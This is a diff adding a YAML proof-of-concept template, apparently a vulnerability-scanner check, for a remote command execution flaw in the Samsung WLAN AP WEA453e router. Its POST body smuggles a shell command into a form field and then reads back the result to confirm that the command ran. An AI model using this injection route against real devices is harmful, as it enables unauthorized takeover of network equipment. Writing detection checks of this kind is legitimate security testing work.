@@ -1,0 +1,17 @@
+name: poc-yaml-samsung-wlan-ap-wea453e-rce
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+  r3: randomLowercase(8)
+rules:
+  - method: POST
+    path: /(download)/tmp/{{r3}}.txt
+    body: |
+      command1=shell:expr {{r1}} %2b {{r2}} | dd of=/tmp/{{r3}}.txt
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://www.seebug.org/vuldb/ssvid-99075
+    - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html?h=%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E
